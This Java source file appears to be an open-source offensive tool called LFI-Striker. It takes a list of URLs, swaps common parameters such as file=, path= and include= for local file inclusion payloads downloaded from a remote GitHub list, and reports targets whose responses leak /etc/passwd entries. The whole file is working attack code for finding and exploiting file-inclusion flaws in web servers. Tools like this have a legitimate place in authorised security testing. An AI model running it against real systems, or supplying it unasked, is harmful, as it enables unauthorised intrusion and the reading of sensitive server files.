package org.Mouath;

import org.apache.commons.cli.*;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    public static void main(String[] args) {
        resetConsoleColor();
        System.out.println("\u001B[32m" + "  _       _____   ___           ____    _            _   _\n" +
                " | |     |  ___| |_ _|         / ___|  | |_   _ __  (_) | | __   ___\n" +
                " | |     | |_     | |   _____  \\___ \\  | __| | '__| | | | |/ /  / _ \\\n" +
                " | |___  |  _|    | |  |_____|  ___) | | |_  | |    | | |   <  |  __/\n" +
                " |_____| |_|     |___|         |____/   \\__| |_|    |_| |_|\\_\\  \\___|\n" +
                "\n" +
                "\n\t\t\t\t\t\t\thttps://github.com/MouathA");
        Options options = new Options();
        options.addOption("i", "input", true, "Input file path");
        options.addOption("d", "delay", true, "Delay time in milliseconds");
        List<String> patterns = Arrays.asList(
                "file=", "document=", "folder=", "root=", "path=", "pg=", "style=", "pdf=", "template=",
                "php_path=", "doc=", "page=", "name=", "cat=", "dir=", "action=", "board=", "date=",
                "detail=", "download=", "prefix=", "include=", "inc=", "locate=", "show=", "site=", "type=",
                "view=", "content=", "layout=", "mod=", "conf=", "url="
        );
        CommandLineParser parser = new DefaultParser();
        try {
            CommandLine cmd = parser.parse(options, args);

            if (cmd.hasOption("i")) {
                String filePath = cmd.getOptionValue("i");
                int delayTime = cmd.hasOption("d") ? Integer.parseInt(cmd.getOptionValue("d")) : 0;

                String text = readTextFromFile(filePath);
                List<String> payloads = readPayloadsFromUrl("https://raw.githubusercontent.com/capture0x/LFI-FINDER/main/lfi.txt");

                if (text != null && !payloads.isEmpty()) {
                    List<String> modifiedLines = processUrls(text, patterns, payloads, delayTime);
                    writeTextToFile("output.txt", modifiedLines);
                    System.out.println("\u001B[32m[+] Parameter replacement completed. Output written to output.txt.");
                } else {
                    System.err.println("\u001B[31m[!] Error reading input text or payloads file.");
                }
            } else {
                System.err.println("\u001B[31m[!] Input file path is required. Use -i option.");
                displayHelp(options);
            }
        } catch (ParseException e) {
            System.err.println("\u001B[31m[!] Error parsing command-line arguments: " + e.getMessage());
        } catch (IOException e) {
            System.err.println("\u001B[31m[!] Error processing text or payloads: " + e.getMessage());
        }
        resetConsoleColor();
    }

    private static void displayHelp(Options options) {
        HelpFormatter formatter = new HelpFormatter();
        formatter.printHelp("\u001B[36mjava -jar LFI-Striker.jar -i <input_file_path> [-d <delay_time_ms>]", options);
    }

    private static String readTextFromFile(String filePath) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
        }
        return sb.toString();
    }

    private static List<String> readPayloadsFromUrl(String url) throws IOException {
        List<String> payloads = new ArrayList<>();
        URL payloadUrl = new URL(url);
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(payloadUrl.openStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                payloads.add(line.trim());
            }
        }
        return payloads;
    }

    private static void writeTextToFile(String filePath, List<String> lines) throws IOException {
        try (PrintWriter writer = new PrintWriter(filePath)) {
            for (String line : lines) {
                writer.println(line);
            }
        }
    }

    private static List<String> processUrls(String text, List<String> patterns, List<String> payloads, int delayTime) {
        List<String> modifiedLines = new ArrayList<>();
        String[] lines = text.split("\\r?\\n");
        for (String line : lines) {
            StringBuilder modifiedLine = new StringBuilder(line);

            boolean lineMatchesPattern = false;
            for (String pattern : patterns) {
                if (line.contains(pattern)) {
                    lineMatchesPattern = true;
                    break;
                }
            }

            if (lineMatchesPattern) {
                for (String lfiPayload : payloads) {
                    StringBuilder tempLine = new StringBuilder(line);
                    for (String pattern : patterns) {
                        String regex = Pattern.quote(pattern) + "([^=&]+)";
                        Matcher matcher = Pattern.compile(regex).matcher(tempLine);
                        while (matcher.find()) {
                            String parameter = matcher.group(1);
                            int startIndex = matcher.start(1);
                            int endIndex = matcher.end(1);
                            if (startIndex >= 0 && endIndex <= tempLine.length()) {
                                tempLine.replace(startIndex, endIndex, lfiPayload);
                                String urlWithPayload = tempLine.toString();
                                if (isValidUrl(urlWithPayload) && lfiPayloadWorks(urlWithPayload)) {
                                    modifiedLines.add("[+] LFI vulnerability detected with payload: " + urlWithPayload);
                                    System.out.println("\u001B[32m[+] LFI vulnerability detected with payload: " + urlWithPayload);
                                    break;
                                } else {
                                    try {
                                        Thread.sleep(delayTime);
                                    } catch (InterruptedException e) {
                                        System.err.println("[!] Thread interrupted while sleeping.");
                                    }
                                }
                            } else {
                                System.err.println("\u001B[31m[!] Error: Index out of bounds for line: " + line);
                                break;
                            }
                        }
                    }
                }
            } else {
                modifiedLines.add("[!] Line does not match any specified pattern. Skipping: " + line);
                System.out.println("\u001B[33m[!] Line does not match any specified pattern. Skipping: " + line);
            }
        }

        System.out.println("\u001B[36m[+] Processing completed. Exiting program.");
        return modifiedLines;
    }


    private static boolean isValidUrl(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (MalformedURLException | URISyntaxException e) {
            System.err.println("\u001B[31m[!] Malformed URL: " + url);
            return false;
        }
    }

    private static boolean lfiPayloadWorks(String url) {
        try {
            Document doc = Jsoup.connect(url).get();
            String htmlContent = doc.html();
            return htmlContent.contains("root:x:0:0") || htmlContent.contains("mail:x:8:");
        } catch (IOException e) {
            System.err.println("\u001B[31m[!] Error fetching webpage content: " + e.getMessage());
            return false;
        }
    }

    private static void resetConsoleColor() {
        System.out.print("\u001B[0m");
    }
}
